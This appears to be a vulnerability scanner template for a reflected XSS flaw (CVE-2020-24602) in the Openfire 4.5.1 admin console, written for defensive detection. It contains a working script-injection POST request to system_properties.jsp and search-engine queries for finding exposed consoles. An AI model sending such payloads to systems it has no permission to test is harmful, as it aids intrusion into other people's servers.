id: CVE-2020-24602

info:
  name: Reflected XSS in Ignite Realtime Openfire 4.5.1
  author: ProjectDiscoveryAI
  severity: medium
  description: Ignite Realtime Openfire 4.5.1 has a reflected Cross-site scripting vulnerability which allows an attacker to execute arbitrary malicious URL via the vulnerable GET parameter searchName", "searchValue", "searchDescription", "searchDefaultValue","searchPlugin", "searchDescription" and "searchDynamic" in the Server Properties and Security Audit Viewer JSP page.
  impact: |
    Allows attackers to execute malicious scripts in the context of a victim's browser session
  remediation: |
    Upgrade Openfire to version 4.6.0 or later to mitigate CVE-2020-24602
  reference:
    - https://github.com/404notf0und/CVE-Flow
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-24602
    cwe-id: CWE-79
    epss-score: 0.00112
    epss-percentile: 0.45929
    cpe: cpe:2.3:a:igniterealtime:openfire:4.5.1:*:*:*:*:*:*:*
  metadata:
    vendor: igniterealtime
    product: openfire
    shodan-query: http.title:"Openfire Admin Console"
    fofa-query:
      - body="welcome to openfire setup"
      - title="openfire admin console"
      - title="openfire"
    google-query:
      - intitle:"openfire admin console"
      - intitle:"openfire"

http:
  - method: POST
    path:
      - "{{BaseURL}}/system_properties.jsp"

    body: |
      action=<script>alert('XSS')</script>&searchName=xss&searchValue=xss&searchDescription=xss&searchDefaultValue=xss&searchPlugin=xss&searchDynamic=xss

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
